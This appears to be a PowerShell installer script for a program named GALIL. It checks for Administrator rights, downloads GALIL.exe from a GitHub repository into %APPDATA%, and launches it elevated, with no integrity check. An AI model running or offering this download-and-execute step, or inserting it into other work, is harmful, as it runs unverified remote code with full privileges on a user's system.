# Check if running as Administrator
If (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "This script must be run as Administrator."
    exit
}

# Define folder and file paths
$appFolder = "$env:APPDATA\GALIL"
$exePath = "$appFolder\GALIL.exe"

# Create folder if it doesn't exist
If (-not (Test-Path -Path $appFolder)) {
    New-Item -ItemType Directory -Path $appFolder | Out-Null
}

# Download the file
$url = "https://github.com/HTKyuu/WindowsGALIL/raw/refs/heads/main/GALIL.exe"
Invoke-WebRequest -Uri $url -OutFile $exePath

# Run the executable as Administrator
Start-Process -FilePath $exePath -Verb RunAs
